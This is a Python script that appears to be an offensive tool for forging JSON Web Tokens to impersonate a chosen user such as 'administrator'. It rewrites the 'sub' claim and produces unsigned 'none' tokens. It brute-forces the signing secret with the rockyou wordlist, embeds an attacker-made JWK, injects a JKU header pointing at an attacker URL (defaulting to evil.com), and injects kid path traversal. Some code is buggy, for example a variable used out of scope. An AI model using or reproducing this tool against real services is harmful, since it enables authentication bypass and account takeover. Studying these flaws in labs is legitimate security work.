#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Tue Jan 16 06:22:35 2024

@author: BlancpBox
"""

import jwt
import base64
import passlib
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend
import subprocess
import json

# Paste JWT token here
token = input('INSERT_TOKEN_HERE: ')
user = input('TARGET USER (administrator): ')
header = jwt.get_unverified_header(token)
algorithm = str(header.get("alg"))
wordlist_file = '/usr/share/wordlists/rockyou.txt'
print(algorithm)
print(f"Decoded header: {header}\n")
print(f"Decoded header:\n{json.dumps(header, indent=4)}\n")

# Load and serialize the public key
with open('public_key.pem', 'rb') as f:
    public_key = serialization.load_pem_public_key(
        f.read(),
        backend=default_backend()
    )

# Decode the JWT
def decoded_token(token, user):
    decoded_token = jwt.decode(token, options={"verify_signature": False})
    print(f"Decoded token:\n{json.dumps(decoded_token, indent=4)}\n")

    decoded_token['sub'] = user
    print(f"Modified payload: {decoded_token}\n")
    print(f"Modified token:\n{json.dumps(decoded_token, indent=4)}\n")
    return decoded_token



def no_sign(token):
    encoded_token = jwt.encode(decoded_token, key=None, algorithm='none')
    print(f"Encoded token with No Signature: {encoded_token}")
    return encoded_token

def sign_token(token, user, secret_key):
    encoded_token = jwt.encode(decoded_token, key=secret_key, algorithm=algorithm)
    print(f"Encoded token with Signature: {encoded_token}")
    return encoded_token


def attempt_fuzzing(secret_key):
    try:
        jwt.decode(token, secret_key, algorithms=[algorithm])
        print(f"Valid key found: {secret_key}")
        return True
    except jwt.InvalidSignatureError:
        return False

def fuzz_secret_key(wordlist_file):
    with open(wordlist_file, "r") as file:
        for line in file:
            secret_key = line.strip()
            try:
                if attempt_fuzzing(secret_key):
                    return secret_key
            except Exception as e:
                print(f"An error occurred while Fuzzing secret: {e}")
                return None

def generate_keys_and_modify_token():
   # Command to generate a new private key
    gen_private_key_command = "sudo openssl genpkey -algorithm RSA -out private_key.pem"

    # Command to extract the public key from the private key
    extract_public_key_command = "sudo openssl rsa -pubout -in private_key.pem -out public_key.pem"

    # Execute the commands using subprocess
    try:
        subprocess.run(gen_private_key_command, shell=True, check=True)
        subprocess.run(extract_public_key_command, shell=True, check=True)
        print("Private and public keys generated successfully.")
    except subprocess.CalledProcessError as e:
        print(f"Error executing OpenSSL commands: {e}")


    # Step 2: Verify the JWT signature
    with open('public_key.pem', 'rb') as f:
        public_key = serialization.load_pem_public_key(
            f.read(),
            backend=default_backend()
        )


    # Step 5: Sign the modified JWT using your RSA private key and embed the public key in the JWK header
    with open('private_key.pem', 'rb') as f:
        private_key = serialization.load_pem_private_key(
            f.read(),
            password=None,
            backend=default_backend()
        )

    # Extract the necessary information from the private key
    public_key = private_key.public_key()
    public_numbers = public_key.public_numbers()

    # Build the JWK header
    jwk = {
        "kty": "RSA",
        "e": base64.urlsafe_b64encode(public_numbers.e.to_bytes((public_numbers.e.bit_length() + 7) // 8, 'big')).rstrip(b'=').decode('utf-8'),
        "kid": header['kid'],
        "n": base64.urlsafe_b64encode(public_numbers.n.to_bytes((public_numbers.n.bit_length() + 7) // 8, 'big')).rstrip(b'=').decode('utf-8')
    }

    # Step 6: Generate the modified token
    try:
        modified_token = jwt.encode(decoded_token, private_key, algorithm=algorithm, headers={'jwk': jwk, 'kid': header['kid']})
        # Print the modified token header
        print(f"Modified header: {jwt.get_unverified_header(modified_token)}\n")
        # Print the final token
        print("Final Token: " + modified_token)
        return modified_token
    except Exception as e:
        print(f"An error occurred while encoding the JWT: {e}")

    return None


def jku_injection():
    try:
        ask = input('Do A JKU INJECTION?(Y/N):  ').strip()  # Added .strip() to remove any leading/trailing spaces
        if ask in ['Y', 'y']:
            jku_url = input('INSERT_URL_HERE (https://evil.com):  ')
            # Sign the modified JWT using your RSA private key
            with open('private_key.pem', 'rb') as f:
                private_key = serialization.load_pem_private_key(
                    f.read(),
                    password=None,
                    backend=default_backend()
                    )

            # Extract the necessary information from the keys
            public_key = private_key.public_key()
            public_numbers = public_key.public_numbers()

            # Build the JWKs
            jwk = {
                "kty": "RSA",
                "e": base64.urlsafe_b64encode(public_numbers.e.to_bytes((public_numbers.e.bit_length() + 7) // 8, 'big')).rstrip(b'=').decode('utf-8'),
                "kid": header['kid'],
                "n": base64.urlsafe_b64encode(public_numbers.n.to_bytes((public_numbers.n.bit_length() + 7) // 8, 'big')).rstrip(b'=').decode('utf-8')
                }
            keys = {"keys": [jwk]}
            print(f"JWK:\n{json.dumps(keys, indent=4)}\n")
              
            # Generate the modified token
            modified_token = jwt.encode(decoded_token, private_key, algorithm=algorithm, headers={'jku': jku_url, 'kid': jwk['kid']})
            # Print the modified token header
            print(f"Modified header:\n{json.dumps(jwt.get_unverified_header(modified_token), indent=4)}\n")
            # Print the final token
            print("Final Token JKU injection: " + modified_token)

        else:
            print("JKU INJECTION not performed.¯\_(ツ)_/¯")        
    except Exception as e:
        print(f"An error occurred while encoding the JWUINJECTION FAILED!!: {e}")



    # Sign the modified JWT using your RSA private key
    with open('private_key.pem', 'rb') as f:
        private_key = serialization.load_pem_private_key(
            f.read(),
            password=None,
            backend=default_backend()
            )

    # Extract the necessary information from the keys
    public_key = private_key.public_key()
    public_numbers = public_key.public_numbers()

    # Build the JWKs
    jwk = {
        "kty": "RSA",
        "e": base64.urlsafe_b64encode(public_numbers.e.to_bytes((public_numbers.e.bit_length() + 7) // 8, 'big')).rstrip(b'=').decode('utf-8'),
        "kid": header['kid'],
        "n": base64.urlsafe_b64encode(public_numbers.n.to_bytes((public_numbers.n.bit_length() + 7) // 8, 'big')).rstrip(b'=').decode('utf-8')
        }
    keys = {"keys": [jwk]}
    print(f"JWK:\n{json.dumps(keys, indent=4)}\n")
    try:  
        # Generate the modified token
        modified_token = jwt.encode(decoded_token, private_key, algorithm=algorithm, headers={'jku': jku_url, 'kid': jwk['kid']})
        # Print the modified token header
        print(f"Modified header:\n{json.dumps(jwt.get_unverified_header(modified_token), indent=4)}\n")
        # Print the final token
        print("Final Token JKU injection: " + modified_token)
    except Exception as e:
        print(f"An error occurred while encoding the JWUINJECTION FAILED!!: {e}")


def path_traversal():
    try:
        ask = input('Do A PATH TRAVERSAL?(Y/N):  ').strip()  # Added .strip() to remove any leading/trailing spaces
        if ask in ['Y', 'y']:
            path = input('INSERT_PATH_TRAVERSAL_HERE  (../../../dev/null)  ')
            # Generate a new token with the modified payload and added header parameter (re-encode)
            modified_token = jwt.encode(decoded_token, '', algorithm=algorithm, headers={"kid": path})
            print(f"Modified token: {modified_token}\n")
        else:
            print("Path traversal not performed.¯\_(ツ)_/¯")
                
    except Exception as e:  # It's good to capture the exception in a variable
        print("An error occurred: ", e)
    




decoded_token = decoded_token(token, user)

# Encode JWT with no signature
no_sign(decoded_token)
# Encode JWT with signature if key is found
try:
    # Start fuzzing
    found_key = fuzz_secret_key(wordlist_file)
    if found_key:
        print(f"\nSecret key found: {found_key}")
       # sign_token(token, user, found_key)
    else:
        print("No valid secret key found.")

except Exception as e:  # It's good to capture the exception in a variable
    print("An error occurred: ", e)

generate_keys_and_modify_token()
jku_injection()
path_traversal()
